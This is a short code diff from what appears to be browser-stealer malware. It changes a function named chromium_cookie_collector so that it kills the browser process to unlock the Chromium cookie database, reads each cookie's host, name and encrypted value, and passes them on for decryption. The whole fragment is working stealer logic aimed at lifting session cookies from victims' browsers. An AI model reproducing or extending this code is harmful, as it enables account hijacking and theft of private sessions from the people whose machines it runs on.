@@ -183,7 +183,15 @@ BOOL chromium_cookie_collector(std::string username, std::string stealer_db)
 			sqlite3_stmt* stmt = query_database(target_cookie_data, "SELECT host_key, name, path, encrypted_value, expires_utc FROM cookies");
 
 			if (stmt == nullptr)
-				continue;
+			{
+				kill_process(dir);
+				stmt = query_database(target_cookie_data, "SELECT host_key, name, path, encrypted_value, expires_utc FROM cookies");
+				
+				if (stmt == nullptr)
+				{
+					continue;
+				}
+			}
 
 			//Decrypt Key
 			ChromiumDecryptor obj;
